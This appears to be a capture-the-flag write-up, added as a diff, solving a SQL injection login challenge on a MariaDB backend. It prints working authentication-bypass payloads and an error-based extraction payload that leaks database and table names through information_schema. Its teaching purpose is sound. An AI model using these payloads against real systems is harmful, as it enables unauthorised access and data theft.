@@ -1,0 +1,147 @@
+#+TITLE: Advent of CTF - Challenge 5
+#+SUBTITLE: "Classic"
+
+* Challenge
+
+Today's challenge is a =SQL Injection=. A spin on the classing injection that is posted on just about every tutorial website.
+
+What you will learn today:
+
+- Discover of SQL Injections
+- Deducing SQL queries
+- Manipulating SQL queries
+
+* Solution 1 - Using the injection
+:PROPERTIES:
+:ATTACH_DIR: /home/arjen/Projects/credmp.github.io/writeups/advent-of-ctf/challenge-5/index_att
+:END:
+
+In this challenge, again, you are faced with a login screen. This time no trickery with cookies or other browser based things however.
+
+#+CAPTION: The familiar login screen
+[[file:index_att/login.png]]
+
+The description of the challenge reads as follows.
+
+#+begin_quote
+Again a login form stands in your way. What powerful 'hacker' tool will help you proceed?
+#+end_quote
+
+The clue in this description is the use of the ='=. This is a hint to the presence of a SQL injection. If the ='= is entered as a username of password (but not both) then a SQL error will occur. 
+
+#+CAPTION: SQL error
+[[file:index_att/sql_error.png]]
+
+Taking the information from the screen it is clear that the backend database is a =MariaDB= server, which is a spinoff of the =MySQL= database. And there is only a little bit of extra information, in the form of the username that was entered. In this case it was =test'=.
+
+#+begin_quote
+Error description: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'test'' at line 1 
+#+end_quote
+
+Exploring common SQL injections it is clear that we also need to use comments. You can either use =--= or =#= as a comment sign. The big difference is that with =--= you need to ensure a space is left behind it, with the =#= a space is not mandatory.
+
+To fully understand the impact of the vulnerability it helps to have the original SQL statement. The following listing is the SQL as used in the code. PHP will further check to see if the =count= equals 1 before proceeding. As an attacker this is unknown and has to be deduced from behaviour.
+
+#+CAPTION: The SQL query used in the code
+#+begin_src sql 
+SELECT count(*)
+  FROM users
+ WHERE username='$username'
+   AND password='$password'
+#+end_src
+
+Given the code above the most common injection that you will find will be the following listing, however that will not work as the count will be 2, given that there are multiple accounts in the database.
+
+#+CAPTION: Common SQL injection
+#+begin_src sql
+' or 1=1 #
+#+end_src
+
+The first option to solve this is to know a username and use that. For instance, it is the =Administrator= login page, so a username of =admin= is not far fetched. A payload such as =admin' #= would yield a value of 1 for the count and will give the flag.
+
+#+CAPTION: SQL payload applied
+#+begin_src sql 
+SELECT count(*)
+  FROM users
+ WHERE username='admin' -- AND password='something'
+#+end_src
+
+But that means you need to guess a username. That is not really fun of course. An alternative way would be to add conditions to the query that result in the same behavior. An example would be to do the following query =' OR username like 'a%' #=. The only guess here is that a username might start with an =a=, which is not unreasonable.
+
+
+#+CAPTION: The flag
+[[file:index_att/flag.png]]
+
+As always, be sure to grab the badge as well.
+
+#+CAPTION: The badge for today
+[[file:index_att/badge.png]]
+
+* Solution 2 - Extracting through the error message
+
+Another way would be to use the error message as a vessel to extract information. [[https://maik.dev/posts/2020/12/challenge-5-adventofctf/][Maik]] wrote a great blog post on this challenge from that perspective. I have recreated the instructions here below.
+
+#+CAPTION: Error extracting SQL query
+#+BEGIN_SRC sql
+' AND (SELECT 1 FROM
+         (SELECT COUNT(*),
+                 CONCAT(
+                    (SELECT database()),
+                    0x3a,
+                    FLOOR(RAND(0)*2)) x
+            FROM information_schema.tables GROUP BY x)
+         y) #
+#+END_SRC
+
+This is quite the payload. First the query has to return something, in this case it will return =1= from the table =y=. This table does not exist (yet), but for every row in =y= it would return =1=. In the case of the payload this does not actually do anything, as the payload will force an error.
+
+#+CAPTION: Error extracting SQL query
+#+BEGIN_SRC sql
+' AND (SELECT 1 FROM y) #
+#+END_SRC
+
+The =y= table is built using a sub query.
+
+#+CAPTION: Table subquery
+#+BEGIN_SRC sql
+SELECT COUNT(*),
+       CONCAT(
+         (SELECT database()),
+         0x3a,
+         FLOOR(RAND(0)*2)
+       ) x
+  FROM information_schema.tables
+ GROUP BY x
+#+END_SRC
+
+The =y= table will be constructed by taking a =count(*)=, which will be the number of times the 2nd column occurs in the result set. The 2nd column is a =CONCAT=, a string concatenation, of yet another sub query, in this case =SELECT database()=, the hex value =0x3a= (ascii character =:=) and a random value =0= or =1=.
+
+The sub query =SELECt database()= is the column of data that is to be extracted. The string concatenation with the random value will keep creating new rows for every row in the table it is queried from, in this case the =information_schema.tables=. It is important that the sub query (=select database()=) returns a single value and that the table it is used against has at least 3 rows so that a duplicate key will be created.
+
+So, in order to see what tables are part of the schema the =information_schema.tables= table can be queries with a =LIMIT= keyword to only return a single row.
+
+#+CAPTION: Payload to extract tables names
+#+BEGIN_SRC sql
+' AND (SELECT 1 FROM (
+SELECT COUNT(*),
+       CONCAT(
+         (SELECT table_name
+            FROM information_schema.tables
+           WHERE table_schema='testdb' LIMIT 0,1),
+         0x3a,
+         FLOOR(RAND(0)*2)
+       ) x
+  FROM information_schema.tables
+ GROUP BY x)
+         y) #
+#+END_SRC
+
+The result will be:
+
+#+BEGIN_QUOTE
+Error description: Duplicate entry 'users:1' for key 'group_key' 
+#+END_QUOTE
+
+Using this technique the =users= table can be exfiltrated giving a username and password and the challenge is solved.
+
+Go back to the [[../../../index.org][homepage]].
